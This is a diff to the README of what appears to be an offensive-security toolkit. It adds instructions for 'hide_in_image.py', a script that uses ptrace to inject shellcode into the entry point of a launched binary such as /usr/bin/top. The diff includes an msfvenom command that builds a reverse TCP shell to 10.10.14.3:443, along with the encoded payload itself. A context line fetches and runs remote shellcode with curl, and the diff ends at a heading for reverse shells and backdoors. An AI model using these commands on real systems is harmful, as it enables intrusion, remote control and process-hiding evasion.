@@ -30,6 +30,13 @@ of course we could do some more interesting stuff with this, like for example:
 FORK=1 python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/shellcode.bin | base64 | tr -d '\n')
 ```
 
+### [hide_in_image.py](hide_in_image.py)
+This script forks and lets the child call `ptrace` to let the parent process trace itself. After the child loaded a given binary using `execv`, the parent replaces the code at the entry point with the given shellcode and detaches. This is essentially an alternative way to run shellcode.
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 | base64 | tr -d '\n'  # ailYmWoCX2oBXg8FSJdIuQIAAbt/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
+python3 hide_in_image.py /usr/bin/top ailYmWoCX2oBXg8FSJdIuQIAAbt/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
+```
+
 ## fancy reverse shells and backdoors
 ```bash
 # classic
